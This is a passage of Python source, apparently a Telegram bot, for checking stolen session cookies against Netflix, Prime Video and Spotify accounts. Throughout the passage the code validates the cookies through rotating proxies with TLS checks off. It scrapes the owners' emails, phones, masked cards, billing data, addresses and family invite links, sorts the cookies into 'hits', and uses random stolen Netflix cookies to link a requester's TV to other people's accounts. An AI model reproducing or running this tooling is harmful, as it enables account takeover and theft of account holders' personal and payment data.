            return {'ok': False, 'reason': 'Redirected to login', 'cookie': cookie_dict}
        
        def find(pattern):
            m = re.search(pattern, txt)
            return safe_html(m.group(1)) if m else None

        name = find(r'"accountOwnerName"\s*:\s*"([^"]+)"') or find(r'"firstName"\s*:\s*"([^"]+)"')
        plan_raw = find(r'localizedPlanName.{1,50}?value":"([^"]+)"') or find(r'"planName"\s*:\s*"([^"]+)"')
        plan = clean_unicode(plan_raw) if plan_raw else None
        country = find(r'"countryOfSignup"\s*:\s*"([^"]+)"') or find(r'"countryCode"\s*:\s*"([^"]+)"') or find(r'"currentCountry"\s*:\s*"([^"]+)"')
        email = find(r'"emailAddress"\s*:\s*"([^"]+)"') or find(r'"email"\s*:\s*"([^"]+)"') or find(r'"loginId"\s*:\s*"([^"]+)"')
        member_since = find(r'"memberSince":"([^"]+)"')
        next_billing = find(r'"nextBillingDate":\{[^}]*"date":"([^T"]+)"') or find(r'"nextBilling"[^}]*"value":"([^"]+)"')
        plan_price = find(r'"planPrice":\{"fieldType":"String","value":"([^"]+)"') or find(r'"formattedPlanPrice"\s*:\s*"([^"]+)"')
        payment = find(r'"paymentMethod":\{"fieldType":"String","value":"([^"]+)"') or find(r'"paymentMethodType"\s*:\s*"([^"]+)"')
        card = find(r'"paymentCardDisplayString"\s*:\s*"([^"]+)"') or find(r'"displayText"\s*:\s*"([^"]+)"')
        phone = find(r'"phoneNumberDigits":\{[^}]*"value":"([^"]+)"') or find(r'"phoneNumber"\s*:\s*"([^"]+)"')
        phone_ver = "Yes" if re.search(r'"isVerified":true', txt) else "No" if re.search(r'"isVerified":false', txt) else None
        quality = find(r'"videoQuality":\{"fieldType":"String","value":"([^"]+)"') or find(r'"maxVideoQuality"\s*:\s*"([^"]+)"')
        streams = find(r'"maxStreams":\{"fieldType":"Numeric","value":([0-9]+)') or find(r'"maxStreams"\s*:\s*"?([0-9]+)"?')
        hold = "Yes" if re.search(r'"isUserOnHold":true', txt) else "No" if re.search(r'"isUserOnHold":false', txt) else None
        extra = "Yes" if re.search(r'"showExtraMemberSection":\{"fieldType":"Boolean","value":true', txt) else "No" if re.search(r'"showExtraMemberSection"', txt) else None
        email_ver = "Yes" if re.search(r'"emailVerified"\s*:\s*true', txt) else "No" if re.search(r'"emailVerified"\s*:\s*false', txt) else None
        guid = find(r'"userGuid":\s*"([^"]+)"') or find(r'"ownerGuid"\s*:\s*"([^"]+)"')
        
        status_match = re.search(r'"membershipStatus":\s*"([^"]+)"', txt)
        ms = status_match.group(1) if status_match else None

        is_prem = ms == 'CURRENT_MEMBER' if ms else bool(plan and 'free' not in str(plan).lower())

        has_data = any([name, email, country, plan, ms, guid])
        is_valid = has_data and 'Account' in txt
        
        if not is_valid and not has_data:
            return {'ok': False, 'reason': 'No account data found', 'cookie': cookie_dict}

        profiles = []
        try:
            rp = session.get("https://www.netflix.com/ManageProfiles", timeout=15)
            if rp.status_code == 200:
                profiles = re.findall(r'"profileName"\s*:\s*"([^"]+)"', rp.text)
                if not profiles:
                    profiles = re.findall(r'"displayName"\s*:\s*"([^"]+)"', rp.text)
                if not profiles:
                    profiles = re.findall(r'"name"\s*:\s*"([^"]+)"', rp.text)
        except:
            pass
        profiles_str = ", ".join([safe_html(p) for p in profiles]) if profiles else None
        
        return {
            'ok': True,
            'premium': is_prem,
            'name': name or 'Unknown',
            'country': country or 'Unknown',
            'plan': plan or 'Unknown',
            'plan_price': plan_price or 'Unknown',
            'member_since': member_since or 'Unknown',
            'next_billing': next_billing or 'Unknown',
            'payment_method': payment or 'Unknown',
            'masked_card': card or 'Unknown',
            'phone': phone or 'Unknown',
            'phone_verified': phone_ver or 'Unknown',
            'video_quality': quality or 'Unknown',
            'max_streams': streams or 'Unknown',
            'on_payment_hold': hold or 'Unknown',
            'extra_member': extra or 'Unknown',
            'email_verified': email_ver or 'Unknown',
            'email': email or 'Unknown',
            'profiles': profiles_str or 'Unknown',
            'user_guid': guid or 'Unknown',
            'membership_status': ms or 'Unknown',
            'cookie': cookie_dict
        }
    except Exception as e:
        return {'ok': False, 'reason': str(e), 'cookie': cookie_dict}

def generate_nftoken(cookie_dict):
    netflix_id = cookie_dict.get('NetflixId')
    if not netflix_id:
        return None, "No NetflixId"
    headers = dict(NFTOKEN_HEADERS)
    headers["Cookie"] = f"NetflixId={netflix_id}"
    try:
        r = requests.get(NFTOKEN_API_URL, params=NFTOKEN_QUERY_PARAMS, headers=headers, timeout=20, verify=False)
        r.raise_for_status()
        data = r.json()
        td = ((((data.get("value") or {}).get("account") or {}).get("token") or {}).get("default") or {})
        token = td.get("token")
        expires = td.get("expires")
        if not token:
            return None, "Dead cookie"
        if isinstance(expires, int) and len(str(expires)) == 13:
            expires //= 1000
        expiry = datetime.fromtimestamp(expires).strftime("%Y-%m-%d %H:%M:%S UTC") if expires else "Unknown"
        return {'token': token, 'expires': expiry, 'expires_unix': expires}, None
    except Exception as e:
        return None, str(e)

def parse_proxy_line(line):
    line = line.strip()
    if not line or line.startswith("#"):
        return None
    m = re.match(r'^(https?|socks5h?)://(?:([^:@]+):([^@]+)@)?([^:]+):(\d+)$', line, re.IGNORECASE)
    if m:
        s, u, p, h, port = m.groups()
        url = f"{s}://{u}:{p}@{h}:{port}" if u else f"{s}://{h}:{port}"
        return {"http": url, "https": url}
    m = re.match(r'^([^:]+):(\d+)$', line)
    if m:
        return {"http": f"http://{m.group(1)}:{m.group(2)}", "https": f"http://{m.group(1)}:{m.group(2)}"}
    return None

def load_proxies():
    proxies = []
    if os.path.exists(PROXY_FILE):
        with open(PROXY_FILE, "r", encoding="utf-8") as f:
            for line in f:
                p = parse_proxy_line(line)
                if p:
                    proxies.append(p)
    return proxies

proxies_list = load_proxies()

def canonicalize_name(name):
    return CANONICAL_NAMES.get(str(name or "").strip().lower(), str(name or "").strip())

def is_netflix_cookie(domain, name):
    return canonicalize_name(name) in ALL_COOKIE_NAMES or "netflix." in str(domain or "").lower()

def extract_cookie_dict_tv(content):
    entries = {}
    
    for line in content.splitlines():
        line = line.strip()
        if not line:
            continue
        if line.startswith("#HttpOnly_"):
            line = line[len("#HttpOnly_"):]
        parts = line.split("\t")
        if len(parts) >= 7:
            name = canonicalize_name(parts[5])
            if is_netflix_cookie(parts[0], name):
                entries[name] = parts[6]
    
    if entries.get("NetflixId"):
        return entries

    try:
        data = json.loads(content)
        if isinstance(data, dict):
            data = data.get("cookies") or data.get("items") or [data]
        if isinstance(data, list):
            for c in data:
                if isinstance(c, dict):
                    name = canonicalize_name(c.get("name", ""))
                    if is_netflix_cookie(c.get("domain", ""), name):
                        entries[name] = str(c.get("value", ""))
    except:
        pass
    
    if entries.get("NetflixId"):
        return entries
    
    for cn in ALL_COOKIE_NAMES:
        m = re.search(rf'{cn}\s*[:=]\s*([^\s;,\n"\']+)', content, re.IGNORECASE)
        if m:
            entries[cn] = m.group(1).strip('"\'')
    
    return entries if entries.get("NetflixId") else None

def validate_cookie_tv(cookies, proxy=None):
    session = requests.Session()
    session.cookies.update(cookies)
    headers = {
        "User-Agent": USER_AGENT,
        "Accept": "text/html,application/xhtml+xml",
        "Accept-Language": "en-US,en;q=0.9",
    }
    try:
        r = session.get("https://www.netflix.com/YourAccount", headers=headers, 
                       proxies=proxy, timeout=REQUEST_TIMEOUT, verify=False, allow_redirects=True)
        
        if 'login' in r.url.lower() or 'signin' in r.url.lower():
            return False, None, None
        
        if r.status_code != 200:
            return False, None, None

        country = None
        plan = None
        
        country_match = re.search(r'"countryOfSignup"\s*:\s*"([^"]+)"', r.text)
        if not country_match:
            country_match = re.search(r'"currentCountry"\s*:\s*"([^"]+)"', r.text)
        if not country_match:
            country_match = re.search(r'"countryCode"\s*:\s*"([^"]+)"', r.text)
        
        plan_match = re.search(r'"localizedPlanName".*?"value":"([^"]+)"', r.text)
        if not plan_match:
            plan_match = re.search(r'"planName"\s*:\s*"([^"]+)"', r.text)
        
        country = country_match.group(1) if country_match else None
        plan = plan_match.group(1) if plan_match else "Unknown"

        has_account = 'Account' in r.text or 'membershipStatus' in r.text
        
        return has_account and country is not None, country, plan
    except:
        return False, None, None

def extract_auth_url(html_text):
    patterns = [
        r'name="authURL"\s+value="([^"]+)"',
        r'authURL["\']?\s*[:=]\s*["\']([^"]+)["\']',
        r'authURL=([^&\s"\']+)',
        r'value="(c1\.[^"]+)"',
    ]
    for pat in patterns:
        m = re.search(pat, html_text)
        if m:
            return urllib.parse.unquote(m.group(1))
    m = re.search(r'c1\.[a-zA-Z0-9%+=/_-]+', html_text)
    return m.group(0) if m else None

def submit_tv_code(session, tv_code, proxy=None):
    url = "https://www.netflix.com/tv8"
    headers = {
        "User-Agent": USER_AGENT,
        "Accept": "text/html,application/xhtml+xml",
        "Accept-Language": "en-US,en;q=0.9",
    }
    
    try:
        r = session.get(url, headers=headers, proxies=proxy, timeout=REQUEST_TIMEOUT, verify=False)
        if r.status_code != 200:
            return {"success": False, "error": f"TV page unavailable (HTTP {r.status_code})"}
    except Exception as e:
        return {"success": False, "error": f"Connection failed: {str(e)[:50]}"}
    
    auth_url = extract_auth_url(r.text)
    if not auth_url:
        return {"success": False, "error": "Could not load activation page"}

    form_data = {
        "flow": "websiteSignUp",
        "authURL": auth_url,
        "flowMode": "enterTvLoginRendezvousCode",
        "withFields": "tvLoginRendezvousCode,isTvUrl2",
        "code": tv_code,
        "tvLoginRendezvousCode": tv_code,
        "action": "nextAction",
    }
    
    post_headers = {
        **headers,
        "Content-Type": "application/x-www-form-urlencoded",
        "Referer": "https://www.netflix.com/tv8",
        "Origin": "https://www.netflix.com",
    }
    
    try:
        r = session.post(url, data=form_data, headers=post_headers, 
                        proxies=proxy, timeout=REQUEST_TIMEOUT, verify=False, 
                        allow_redirects=True)
    except Exception as e:
        return {"success": False, "error": f"Activation request failed: {str(e)[:50]}"}

    final_url = r.url

    if "/tv/out/success" in final_url.lower():
        return {"success": True, "error": None}
    
    if "success" in final_url.lower() and "tv" in final_url.lower():
        return {"success": True, "error": None}

    success_patterns = [
        r"your tv is ready",
        r"tu tv est[aá] lista",
        r"sua tv est[aá] pronta",
        r"votre t[ée]l[ée] est pr[eê]t",
        r"dein tv ist bereit",
        r"la tua tv [eè] pronta",
        r"tv'niz hazır",
        r"t[ée]l[ée]vision activ[ée]",
        r"successfully activated",
    ]
    
    text_clean = re.sub(r'<[^>]+>', ' ', r.text)
    text_clean = html_mod.unescape(text_clean)
    text_clean = re.sub(r'\s+', ' ', text_clean).strip().lower()
    
    for pat in success_patterns:
        if re.search(pat, text_clean):
            return {"success": True, "error": None}

    error_patterns = [
        r"that code wasn'?t right",
        r"code (is )?(incorrect|invalid|wrong|expired)",
        r"try again",
        r"c[oó]digo (es |incorrecto|inv[aá]lido)",
        r"int[ée]ntalo de nuevo",
        r"code (est |incorrect|invalide)",
        r"code (ist |ung[uü]ltig|falsch)",
        r"codice (non [eè] |sbagliato)",
        r"kod (yanlış|ge[çc]ersiz)",
        r"код (неверный|неправильный)",
        r"代码(有误|错误|无效)",
        r"코드(가|는)?(잘못|틀렸)",
        r"コード(が|は)?(間違|違)",
    ]
    
    for pat in error_patterns:
        if re.search(pat, text_clean):
            return {"success": False, "error": "Invalid or expired TV code"}

    if "/tv/" in final_url.lower() and "code" not in final_url.lower():
        return {"success": True, "error": None}
    
    return {"success": False, "error": f"Unknown response (URL: {final_url[:50]})"}

def get_vault_cookies():
    if not os.path.exists(COOKIES_DIR):
        return []
    return [f for f in os.listdir(COOKIES_DIR) if f.lower().endswith((".txt", ".json"))]

def get_random_cookie_file():
    with cookie_lock:
        files = get_vault_cookies()
        if not files:
            return None, None
        filename = random.choice(files)
        filepath = os.path.join(COOKIES_DIR, filename)
        try:
            with open(filepath, "r", encoding="utf-8", errors="ignore") as f:
                content = f.read()
            os.remove(filepath)
            return filename, content
        except:
            return None, None

def count_vault_cookies():
    return len(get_vault_cookies())

def process_tv_login(tv_code):
    max_attempts = min(100, max(count_vault_cookies() * 2, 50))
    attempts = 0
    tried_countries = []
    
    while attempts < max_attempts:
        attempts += 1
        
        filename, content = get_random_cookie_file()
        if not filename:
            return {"success": False, "error": "no_cookies_left"}
        
        cookies = extract_cookie_dict_tv(content)
        if not cookies or not cookies.get('NetflixId'):
            continue
        
        proxy = random.choice(proxies_list) if proxies_list else None

        valid, country, plan = validate_cookie_tv(cookies, proxy)
        
        if not valid:
            continue
        
        if country:
            tried_countries.append(country)

        session = requests.Session()
        session.cookies.update(cookies)
        result = submit_tv_code(session, tv_code, proxy)
        result["country"] = country
        result["plan"] = plan
        result["cookie_file"] = filename
        result["tried_countries"] = tried_countries
        
        if result["success"]:
            return result

        if "Invalid" in str(result.get("error", "")) or "expired" in str(result.get("error", "")).lower():
            return result
        
    
    return {"success": False, "error": "all_cookies_failed", "tried_countries": tried_countries}

BRAILLE = ["⠋", "⠙", "⠹", "⠸", "⠼", "⠴", "⠦", "⠧", "⠇", "⠏"]

async def animate_message(ctx, chat_id, msg_id, stop_event):
    idx = 0
    while not stop_event.is_set():
        f = BRAILLE[idx % len(BRAILLE)]
        try:
            await ctx.bot.edit_message_text(
                chat_id=chat_id, message_id=msg_id,
                text=f"{f} Searching vault for working cookie...\n\nTrying cookies one by one...\nPlease wait..."
            )
        except:
            pass
        idx += 1
        await asyncio.sleep(0.3)

# ==================== PRIME CHECKER IMPLEMENTATION ====================
def prime_check_cookies_sync(cookie_files, base_path, progress_callback=None):
    """
    Process Prime Video cookies and return results.
    This is the synchronous version that runs in a thread.
    """
    # Create folders
    for folder in ["cookies", "failed", "broken", "hits"]:
        os.makedirs(os.path.join(base_path, folder), exist_ok=True)

    # Move cookie files to cookies folder
    cookies_folder = os.path.join(base_path, "cookies")
    cookie_file_names = []
    for cookie_file in cookie_files:
        src = cookie_file
        dst = os.path.join(cookies_folder, os.path.basename(src))
        shutil.move(src, dst)
        cookie_file_names.append(os.path.basename(dst))

    counts = {"hits": 0, "free": 0, "unknown": 0, "bad": 0, "duplicate": 0, "errors": 0}
    paid_counts = {"paid": 0, "free": 0, "unknown": 0}
    seen_keys = set()
    run_folder = prime_get_run_folder()
    stats_lock = threading.Lock()
    dedupe_lock = threading.Lock()
    processed = 0
    total = len(cookie_file_names)
    config = PRIME_DEFAULT_CONFIG

    def finalize(result_type, is_paid):
        nonlocal processed
        with stats_lock:
            processed += 1
            if result_type == "success":
                counts["hits"] += 1
                paid_counts["paid"] += 1
            elif result_type == "free":
                counts["free"] += 1
                paid_counts["free"] += 1
            elif result_type == "unknown":
                counts["unknown"] += 1
                paid_counts["unknown"] += 1
            elif result_type == "failed":
                counts["bad"] += 1
            elif result_type == "duplicate":
                counts["duplicate"] += 1
            elif result_type == "error":
                counts["errors"] += 1
            if progress_callback:
                progress_callback(total, processed, counts, paid_counts)

    def get_next_proxy(used_proxy_indices):
        proxies = prime_load_proxies()
        if not proxies:
            return None, None
        available = [idx for idx in range(len(proxies)) if idx not in used_proxy_indices]
        if not available:
            available = list(range(len(proxies)))
        chosen_index = random.choice(available)
        return proxies[chosen_index], chosen_index

    def check_cookie(cookie_file):
        cookie_path = os.path.join(cookies_folder, cookie_file)
        result_type = None
        is_paid = None

        try:
            netscape_content, cookies = prime_parse_cookie_file(cookie_path)
            if not cookies:
                result_type = "failed"
                shutil.move(cookie_path, os.path.join(base_path, "failed", cookie_file))
                finalize(result_type, is_paid)
                return

            if not prime_has_required_auth_cookies(cookies):
                result_type = "failed"
                shutil.move(cookie_path, os.path.join(base_path, "failed", cookie_file))
                finalize(result_type, is_paid)
                return

            session = requests.Session()
            session.cookies.update(cookies)
            session.headers.update({"Accept-Encoding": "identity"})

            source_text = None
            status_code = None
            config_data = {}
            last_exception = None
            used_proxy_indices = set()

            for attempt in range(3):
                proxy, proxy_index = get_next_proxy(used_proxy_indices)
                if proxy_index is not None:
                    used_proxy_indices.add(proxy_index)
                try:
                    source_text, status_code, config_data = prime_get_video_data(session, proxy)
                    if status_code == 200 and source_text:
                        break
                    if status_code in {429, 500, 502, 503, 504, CONFIG_UNAVAILABLE_STATUS} and attempt < 2:
                        continue
                    break
                except Exception as exc:
                    last_exception = exc
                    if attempt < 2:
                        continue

            if source_text:
                data = prime_infer_prime_video_data(source_text, cookie_file, config_data)
                if data.get("signin_state") == "sign_in_page":
                    result_type = "failed"
                    shutil.move(cookie_path, os.path.join(base_path, "failed", cookie_file))
                    finalize(result_type, is_paid)
                    return
            else:
                data = {}

            if status_code == 200 and source_text:
                is_paid = data.get("is_paid")
                if is_paid is None:
                    is_paid = False
                    data["is_paid"] = False
                    data["paid_status"] = prime_format_paid_label(False)
                    data["plan"] = prime_plan_label_from_paid_state(False)
                dedupe_key = prime_build_duplicate_key(data, cookies)
                is_duplicate = False
                should_dedupe = bool(dedupe_key)
                if should_dedupe:
                    with dedupe_lock:
                        if dedupe_key in seen_keys:
                            is_duplicate = True
                        else:
                            seen_keys.add(dedupe_key)

                if is_duplicate:
                    result_type = "duplicate"
                    duplicate_output_path = prime_create_duplicate_output_folder(run_folder, base_path)
                    filename = prime_generate_filename(data)
                    formatted_cookie = prime_format_cookie_file(data, netscape_content, config)
                    with open(os.path.join(duplicate_output_path, filename), "w", encoding="utf-8") as f:
                        f.write(formatted_cookie)
                    os.remove(cookie_path)
                else:
                    output_path = prime_create_output_folder_when_needed(is_paid, run_folder, base_path)
                    filename = prime_generate_filename(data)
                    formatted_cookie = prime_format_cookie_file(data, netscape_content, config)
                    with open(os.path.join(output_path, filename), "w", encoding="utf-8") as f:
                        f.write(formatted_cookie)
                    os.remove(cookie_path)
                    result_type = prime_result_type_from_paid_state(is_paid)
            elif prime_should_storefront_fallback_to_unknown(status_code, data):
                data = prime_set_unknown_plan_data(data)
                is_paid = None
                dedupe_key = prime_build_duplicate_key(data, cookies)
                is_duplicate = False
                should_dedupe = bool(dedupe_key)
                if should_dedupe:
                    with dedupe_lock:
                        if dedupe_key in seen_keys:
                            is_duplicate = True
                        else:
                            seen_keys.add(dedupe_key)

                if is_duplicate:
                    result_type = "duplicate"
                    duplicate_output_path = prime_create_duplicate_output_folder(run_folder, base_path)
                    filename = prime_generate_filename(data)
                    formatted_cookie = prime_format_cookie_file(data, netscape_content, config)
                    with open(os.path.join(duplicate_output_path, filename), "w", encoding="utf-8") as f:
                        f.write(formatted_cookie)
                    os.remove(cookie_path)
                else:
                    output_path = prime_create_output_folder_when_needed(is_paid, run_folder, base_path)
                    filename = prime_generate_filename(data)
                    formatted_cookie = prime_format_cookie_file(data, netscape_content, config)
                    with open(os.path.join(output_path, filename), "w", encoding="utf-8") as f:
                        f.write(formatted_cookie)
                    os.remove(cookie_path)
                    result_type = "unknown"
            else:
                signin_state = data.get("signin_state", "unknown") if isinstance(data, dict) else "unknown"
                result_type = prime_classify_non_success_result(status_code, signin_state, last_exception)
                target_folder = "failed" if result_type == "failed" else "broken"
                shutil.move(cookie_path, os.path.join(base_path, target_folder, cookie_file))
        except Exception as e:
            result_type = "error"
            try:
                shutil.move(cookie_path, os.path.join(base_path, "broken", cookie_file))
            except Exception:
                pass

        finalize(result_type, is_paid)

    # Process all cookies
    for cookie_file in cookie_file_names:
        check_cookie(cookie_file)

    return counts, paid_counts

# ==================== SPOTIFY CHECKER ====================
SPOTIFY_DEFAULT_CONFIG = {
    "txt_fields": {
        "plan": True,
        "email": True,
        "country": True,
        "owner": True,
        "free_slots": True,
        "invite_link": True,
        "address": True
    },
    "notifications": {
        "webhook": {"enabled": False},
        "telegram": {"enabled": False}
    },
    "retries": {"error_proxy_attempts": 1}
}

def spotify_plan_name_mapping(plan: str) -> str:
    mapping = {
        "duo_premium": "Duo Premium",
        "family_premium_v2": "Family Premium",
        "family_basic": "Family Basic",
        "premium": "Premium",
        "premium_mini": "Premium Mini",
        "basic_premium": "Premium Basic",
        "student_premium": "Student Premium",
        "student_premium_hulu": "Student Premium-Hulu",
        "free": "Free"
    }
    return mapping.get(plan, "Unknown")

def spotify_infer_plan_key(plan_name: str) -> str:
    if not plan_name:
        return "unknown"
    name = plan_name.strip().lower()
    if "free" in name:
        return "free"
    if "family" in name and "basic" in name:
        return "family_basic"
    if "family" in name:
        return "family_premium_v2"
    if "duo" in name:
        return "duo_premium"
    if "student" in name and "hulu" in name:
        return "student_premium_hulu"
    if "student" in name:
        return "student_premium"
    if "mini" in name:
        return "premium_mini"
    if "basic" in name and "premium" in name:
        return "basic_premium"
    if "premium" in name:
        return "premium"
    return "unknown"

def spotify_extract_first(text: str, patterns: List[str], flags=0) -> Optional[str]:
    for pattern in patterns:
        match = re.search(pattern, text, flags)
        if match:
            return match.group(1)
    return None

def spotify_to_int(value) -> Optional[int]:
    try:
        return int(str(value).strip())
    except:
        return None

def spotify_parse_next_payment_date_from_html(source: str) -> Optional[datetime.date]:
    normalized = source.replace('\\"', '"').replace("&quot;", '"')
    combined = f"{source}\n{normalized}"
    candidate = spotify_extract_first(
        combined,
        [
            r'next bill[^<]{0,220}?\bon\b\s*([0-9]{1,2}/[0-9]{1,2}/[0-9]{4})',
            r'next payment[^<]{0,220}?\bon\b\s*([0-9]{1,2}/[0-9]{1,2}/[0-9]{4})',
            r'next bill[^<]{0,220}?\bon\b\s*([A-Za-z]{3,9}\s+\d{1,2},\s+\d{4})',
            r'next payment[^<]{0,220}?\bon\b\s*([A-Za-z]{3,9}\s+\d{1,2},\s+\d{4})'
        ],
        flags=re.IGNORECASE
    )
    if not candidate:
        return None
    candidate = candidate.strip()
    for fmt in ("%m/%d/%Y", "%B %d, %Y", "%b %d, %Y"):
        try:
            return datetime.strptime(candidate, fmt).date()
        except:
            pass
    if re.match(r"^\d{1,2}/\d{1,2}/\d{4}$", candidate):
        try:
            part_a, part_b, year = [int(x) for x in candidate.split("/")]
            month, day = part_a, part_b
            if part_a > 12 and part_b <= 12:
                month, day = part_b, part_a
            return datetime(year, month, day).date()
        except:
            return None
    return None

def spotify_is_external_billing_managed(source: str) -> bool:
    normalized = source.replace('\\"', '"').replace("&quot;", '"')
    combined = f"{source}\n{normalized}"
    return re.search(
        r'managed\s+through\s+(google\s+play|apple|app\s*store|itunes)',
        combined,
        flags=re.IGNORECASE
    ) is not None

def spotify_deep_find_first(obj, key_names):
    if isinstance(obj, dict):
        for key, value in obj.items():
            if str(key).lower() in key_names and value not in (None, ""):
                return value
            nested = spotify_deep_find_first(value, key_names)
            if nested not in (None, ""):
                return nested
    elif isinstance(obj, list):
        for item in obj:
            nested = spotify_deep_find_first(item, key_names)
            if nested not in (None, ""):
                return nested
    return None

def spotify_parse_overview_data(source: str) -> dict:
    normalized = source.replace('\\"', '"').replace("&quot;", '"')
    combined = f"{source}\n{normalized}"

    logged_in = (
        ('loggedIn\\":true' in source) or
        ('"loggedIn":true' in normalized) or
        ('"isLoggedInUser":true' in normalized)
    )

    plan_name = spotify_extract_first(
        combined,
        [
            r'planName\\":\\"([^"]+)',
            r'"planName":"([^"]+)"',
            r'data-encore-id="text">([^<]+)<'
        ],
        flags=re.IGNORECASE
    )
    plan_key = spotify_infer_plan_key(plan_name or "")

    country = spotify_extract_first(
        combined,
        [
            r'country\\":\\"([A-Za-z]{2})',
            r'"country":"([A-Za-z]{2})"',
            r'countryCode\\":\\"([A-Za-z]{2})',
            r'"countryCode":"([A-Za-z]{2})"'
        ]
    )
    if country:
        country = country.upper()

    is_master_match = spotify_extract_first(
        combined,
        [r'isMaster\\":(true|false)', r'"isMaster":(true|false)'],
        flags=re.IGNORECASE
    )
    is_sub_account_match = spotify_extract_first(
        combined,
        [r'isSubAccount\\":(true|false)', r'"isSubAccount":(true|false)'],
        flags=re.IGNORECASE
    )
    is_child_account_match = spotify_extract_first(
        combined,
        [r'isChildAccount\\":(true|false)', r'"isChildAccount":(true|false)'],
        flags=re.IGNORECASE
    )
    recurring_match = spotify_extract_first(
        combined,
        [r'isRecurring\\":(true|false)', r'"isRecurring":(true|false)'],
        flags=re.IGNORECASE
    )
    trial_match = spotify_extract_first(
        combined,
        [r'isTrialUser\\":(true|false)', r'"isTrialUser":(true|false)'],
        flags=re.IGNORECASE
    )
    email = spotify_extract_first(
        combined,
        [r'email\\":\\"([^"]+)', r'"email":"([^"]+)"'],
        flags=re.IGNORECASE
    )
    invite_link = spotify_extract_first(
        combined,
        [
            r'inviteLink\\":\\"([^"]+)',
            r'"inviteLink":"([^"]+)"',
            r'(https://www\.spotify\.com/[^"\s]*family[^"\s]*)'
        ],
        flags=re.IGNORECASE
    )
    address = spotify_extract_first(
        combined,
        [
            r'address\\":\\"([^"]+)',
            r'"address":"([^"]+)"',
            r'streetAddress\\":\\"([^"]+)',
            r'"streetAddress":"([^"]+)"'
        ],
        flags=re.IGNORECASE
    )
    free_slots_direct = spotify_extract_first(
        combined,
        [
            r'freeSlots\\":(\d+)',
            r'"freeSlots":(\d+)',
            r'availableSlots\\":(\d+)',
            r'"availableSlots":(\d+)'
        ],
        flags=re.IGNORECASE
    )
    members_count = spotify_extract_first(
        combined,
        [
            r'membersCount\\":(\d+)',
            r'"membersCount":(\d+)',
            r'memberCount\\":(\d+)',
            r'"memberCount":(\d+)'
        ],
        flags=re.IGNORECASE
    )
    max_members = spotify_extract_first(
        combined,
        [
            r'maxMembers\\":(\d+)',
            r'"maxMembers":(\d+)',
            r'memberLimit\\":(\d+)',
            r'"memberLimit":(\d+)'
        ],
        flags=re.IGNORECASE
    )

    is_sub_account = None
    if is_master_match is not None:
        is_sub_account = (is_master_match.lower() != "true")
    elif is_sub_account_match is not None:
        is_sub_account = (is_sub_account_match.lower() == "true")

    free_slots = spotify_to_int(free_slots_direct)
    if free_slots is None:
        members_count_int = spotify_to_int(members_count)
        max_members_int = spotify_to_int(max_members)
        if members_count_int is not None and max_members_int is not None:
            free_slots = max(max_members_int - members_count_int, 0)

    if invite_link:
        invite_link = invite_link.replace("\\/", "/")

    return {
        "loggedIn": logged_in,
        "currentPlan": plan_key,
        "country": country or "unknown",
        "isRecurring": recurring_match is not None and recurring_match.lower() == "true",
        "isTrialUser": trial_match is not None and trial_match.lower() == "true",
        "isSubAccount": is_sub_account,
        "email": email or "",
        "inviteLink": invite_link or "",
        "address": address or "",
        "freeSlots": free_slots,
        "isChildAccount": is_child_account_match is not None and is_child_account_match.lower() == "true"
    }

def spotify_enrich_family_data_from_home_api(data: dict, family_json: dict) -> dict:
    if not isinstance(family_json, dict):
        return data

    members = family_json.get("members")
    if not isinstance(members, list):
        members = []
    access_control = family_json.get("accessControl")
    if not isinstance(access_control, dict):
        access_control = {}
    features = family_json.get("features")
    if not isinstance(features, list):
        features = []

    logged_member = None
    for member in members:
        if isinstance(member, dict) and member.get("isLoggedInUser") is True:
            logged_member = member
            break

    if logged_member is not None:
        is_master = logged_member.get("isMaster")
        if isinstance(is_master, bool):
            data["isSubAccount"] = (not is_master)
        is_child = logged_member.get("isChildAccount")
        if isinstance(is_child, bool):
            data["isChildAccount"] = is_child

        member_country = logged_member.get("country")
        if (not data.get("country") or str(data.get("country")).lower() == "unknown") and member_country:
            data["country"] = str(member_country).upper()

    max_capacity = spotify_to_int(family_json.get("maxCapacity"))
    if max_capacity is not None:
        free_slots = max(max_capacity - len(members), 0)
        data["freeSlots"] = free_slots
    elif isinstance(access_control.get("planHasFreeSlots"), bool):
        data["freeSlots"] = 1 if access_control.get("planHasFreeSlots") else 0

    family_address = family_json.get("address")
    if family_address:
        data["address"] = str(family_address)

    invite_token = family_json.get("inviteToken")
    if invite_token:
        data["inviteLink"] = f"https://www.spotify.com/family/join/invite/{invite_token}/"

    if data.get("currentPlan") in ("unknown", "free"):
        if "kids" in features or "genAlpha" in features:
            data["currentPlan"] = "family_premium_v2"
        else:
            data["currentPlan"] = "family_basic"

    return data

def spotify_get_account_data_from_new_api(session: requests.Session, proxy=None):
    overview_headers = {
        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
        "Accept-Language": "en-US,en;q=0.5",
        "Cache-Control": "no-cache",
        "Connection": "keep-alive",
        "Pragma": "no-cache",
        "Upgrade-Insecure-Requests": "1",
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:132.0) Gecko/20100101 Firefox/132.0",
        "X-Requested-With": "XMLHttpRequest"
    }
    overview_urls = [
        "https://www.spotify.com/us/account/overview/?utm_source=spotify&utm_medium=menu&utm_campaign=your_account",
        "https://www.spotify.com/account/overview/?utm_source=spotify&utm_medium=menu&utm_campaign=your_account"
    ]
    overview_resp = None
    last_status_code = None
    for overview_url in overview_urls:
        try:
            resp = session.get(overview_url, headers=overview_headers, proxies=proxy, timeout=20)
            last_status_code = resp.status_code
            if resp.status_code in (403, 429):
                return None, resp.status_code
            if resp.status_code == 200:
                overview_resp = resp
                break
        except:
            continue

    if overview_resp is None:
        return None, last_status_code if last_status_code is not None else 500

    data = spotify_parse_overview_data(overview_resp.text)
    if not data.get("loggedIn"):
        return None, 401

    profile_headers = {
        "Accept": "application/json, text/plain, */*",
        "Accept-Language": "en-US,en;q=0.5",
        "Cache-Control": "no-cache",
        "Connection": "keep-alive",
        "Pragma": "no-cache",
        "Referer": "https://www.spotify.com/account/profile/",
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:132.0) Gecko/20100101 Firefox/132.0"
    }
    profile_url = "https://www.spotify.com/api/account-settings/v1/profile"
    try:
        profile_resp = session.get(
            profile_url,
            headers=profile_headers,
            proxies=proxy,
            timeout=20,
            allow_redirects=False
        )
        if profile_resp.status_code == 200:
            try:
                profile_json = profile_resp.json()
                profile_section = profile_json.get("profile", {})
                if not isinstance(profile_section, dict):
                    profile_section = {}
                profile_country = profile_section.get("country") or profile_json.get("country")
                profile_email = profile_section.get("email") or profile_json.get("email")
                if profile_country:
                    data["country"] = str(profile_country).upper()
                if profile_email:
